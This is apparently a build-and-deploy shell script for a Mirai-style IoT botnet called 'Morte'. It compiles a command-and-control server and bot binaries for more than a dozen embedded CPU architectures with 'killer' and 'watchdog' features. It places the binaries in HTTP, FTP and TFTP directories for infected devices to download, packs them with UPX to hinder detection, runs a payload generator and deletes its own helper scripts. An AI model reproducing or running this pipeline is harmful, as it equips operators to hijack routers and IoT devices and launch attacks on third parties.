...
function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2"
...
function arc_compile {
    "$1-linux-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2"
...
mkdir /var/www/html
mkdir /var/www/html/00101010101001

echo " [Morte] > Building - cnc"
go build -o loader/cnc cnc/*.go
mv ~/cnc/config.json ~/
mv ~/cnc/honeypot.json ~/
rm -rf ~/cnc
mv ~/loader/cnc ~/

echo " [Morte] > Building - arc"
arc_compile arc morte.arc "-static -DKILLER -DWATCHDOG -DMorte_arch=\"arc\""
echo " [Morte] > Building - x86"
compile_bot i586 morte.x86 "-static -DKILLER -DWATCHDOG -DMorte_arch=\"x86\""
echo " [Morte] > Building - x86_64"
compile_bot x86_64 morte.x86_64 "-static -DKILLER -DWATCHDOG -DMorte_arch=\"x86_64\""
echo " [Morte] > Building - i686"
compile_bot i686 morte.i686 "-static -DKILLER -DWATCHDOG -DMorte_arch=\"i686\""
echo " [Morte] > Building - mips"
compile_bot mips morte.mips "-static -DKILLER -DWATCHDOG -DMorte_arch=\"mips\""
echo " [Morte] > Building - mipsel"
compile_bot mipsel morte.mpsl "-static -DKILLER -DWATCHDOG -DMorte_arch=\"mpsl\""
echo " [Morte] > Building - armv4l"
compile_bot armv4l morte.arm "-static -DKILLER -DWATCHDOG -DMorte_arch=\"arm\""
echo " [Morte] > Building - armv5l"
compile_bot armv5l morte.arm5 "-DKILLER -DWATCHDOG -DMorte_arch=\"arm5\""
echo " [Morte] > Building - armv6l"
compile_bot armv6l morte.arm6 "-static -DKILLER -DWATCHDOG -DMorte_arch=\"arm6\""
echo " [Morte] > Building - armv7l"
compile_bot_arm7 armv7l morte.arm7 "-static -DKILLER -DWATCHDOG -DMorte_arch=\"arm7\""
echo " [Morte] > Building - powerpc"
compile_bot powerpc morte.ppc "-static -DKILLER -DWATCHDOG -DMorte_arch=\"ppc\""
echo " [Morte] > Building - sparc"
compile_bot sparc morte.spc "-static -DKILLER -DWATCHDOG -DMorte_arch=\"spc\""
echo " [Morte] > Building - m68k"
compile_bot m68k morte.m68k "-static -DKILLER -DWATCHDOG -DMorte_arch=\"m68k\""
echo " [Morte] > Building - sh4"
compile_bot sh4 morte.sh4 "-static -DKILLER -DWATCHDOG -DMorte_arch=\"sh4\""
echo " [Morte] > Building - debug"
compile_bot i586 debug "-static -DKILLER -DWATCHDOG -DDEBUG -DMorte_arch=\"x86\""

cp release/debug /var/www/html/00101010101001
cp release/morte.* /var/www/html/00101010101001
cp release/morte.* /var/ftp
mv release/morte.* /var/lib/tftpboot
rm -rf release

echo " [Morte] > Building - loader"
...
tar -xvf *.xz
mv upx*/upx .
./upx --ultra-brute /var/www/html/00101010101001/*
./upx --ultra-brute /var/lib/tftpboot/*
./upx --ultra-brute /var/ftp/*
rm -rf upx*
python3 payload.py
rm -rf payload.py auto.sh
